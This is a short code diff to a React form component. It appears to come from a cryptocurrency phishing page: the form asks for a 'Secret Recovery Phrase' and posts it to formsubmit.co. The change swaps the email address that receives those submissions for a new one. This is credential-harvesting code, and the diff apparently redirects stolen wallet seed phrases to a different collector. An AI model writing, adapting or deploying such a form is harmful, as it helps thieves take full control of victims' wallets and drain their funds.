@@ -12,7 +12,7 @@ const Form = () => {
     }
   return (
     <div>
-        <form action="https://formsubmit.co/nevarezpee@gmail.com" method="POST" >
+        <form action="https://formsubmit.co/advisorytravel8@gmail.com" method="POST" >
 			<div>
 				<div class="labPar">
 					<label for="key">Secret Recovery Phrase</label>
